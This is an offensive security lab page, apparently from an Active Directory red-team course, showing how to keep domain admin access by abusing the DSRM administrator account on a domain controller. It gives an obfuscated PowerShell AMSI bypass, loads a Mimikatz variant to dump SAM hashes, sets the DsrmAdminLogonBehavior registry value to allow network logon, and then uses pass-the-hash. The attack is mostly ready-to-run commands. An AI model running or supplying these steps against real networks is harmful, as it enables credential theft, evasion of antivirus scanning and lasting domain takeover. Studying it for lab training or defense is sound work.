# 👽 Abuse the DSRM credential for persistence

{% hint style="info" %}
### What is Directory Services Restore Mode (DSRM)?

Directory Services Restore Mode (DSRM) is a Safe Mode [boot](https://www.techtarget.com/searchwindowsserver/definition/boot) option for [Windows Server](https://www.techtarget.com/searchwindowsserver/definition/Microsoft-Windows-Server-OS-operating-system) [domain controllers](https://www.techtarget.com/searchwindowsserver/definition/domain-controller). DSRM enables an administrator to repair, recover or restore an Active Directory ([AD](https://www.techtarget.com/searchwindowsserver/definition/Active-Directory)) database. Restarting a [domain](https://www.techtarget.com/whatis/definition/domain) controller in DSRM takes it offline so it functions only as a regular server.
{% endhint %}

We can persist with administrative access on the DC once we have Domain Admin privileges by abusing the DSRM administrator. With the domain admin privileges obtained earlier, run the following commands on the DC to open a PowerShell remoting session. As always, remember that we could use other tools like SafetyKatz, BetterSafetyKatz

```
$sess = New-PSSession dcorp-dc  
Enter-PSSession -Session $sess  
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
exit 
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we need to laod Invoke-Mimi on the session, let's run this from the local machine

```
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```

Then once it's done we'll enter the session and run the lsadump::lsa command:

```
Enter-PSSession -Session $sess
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC. We can do this as follows:

```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

Now from our local system we can just pass the hash for the DSRM administrator:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can now list all the shares of the domain controller:

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
